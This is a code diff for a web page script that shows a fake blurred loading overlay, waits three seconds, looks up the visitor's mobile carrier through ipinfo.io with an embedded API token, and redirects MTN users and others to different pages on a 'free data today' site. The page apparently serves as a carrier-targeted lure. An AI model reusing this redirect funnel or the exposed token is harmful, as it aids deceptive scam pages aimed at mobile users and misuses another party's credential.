@@ -141,35 +141,39 @@
       // Show the blurred loading overlay
       bridge.style.display = 'flex';
 
-      fetch("https://ipinfo.io/json?token=55355b912bdc12")
-        .then(res => res.json())
-        .then(data => {
+      setTimeout(() => {
 
-          const network = data.org ? data.org.toLowerCase() : "";
+        fetch("https://ipinfo.io/json?token=55355b912bdc12")
+          .then(res => res.json())
+          .then(data => {
 
-          if (network.includes("mtn")) {
+            const network = data.org ? data.org.toLowerCase() : "";
 
-            window.location.href =
-              "https://getfreedatatoday.netlify.app/spareforme.html";
+            if (network.includes("mtn")) {
 
-          } else if (network.includes("airtel")) {
+              window.location.href =
+                "https://getfreedatatoday.netlify.app/spareforme.html";
+
+            } else if (network.includes("airtel")) {
+
+              window.location.href =
+                "https://getfreedatatoday.netlify.app/home.html";
+
+            } else {
+
+              window.location.href =
+                "https://getfreedatatoday.netlify.app/home.html";
+            }
+
+          })
+          .catch(() => {
 
             window.location.href =
               "https://getfreedatatoday.netlify.app/home.html";
 
-          } else {
+          });
 
-            window.location.href =
-              "https://getfreedatatoday.netlify.app/home.html";
-          }
-
-        })
-        .catch(() => {
-
-          window.location.href =
-            "https://getfreedatatoday.netlify.app/home.html";
-
-        });
+      }, 3000);
     }
   </script>
 </head>
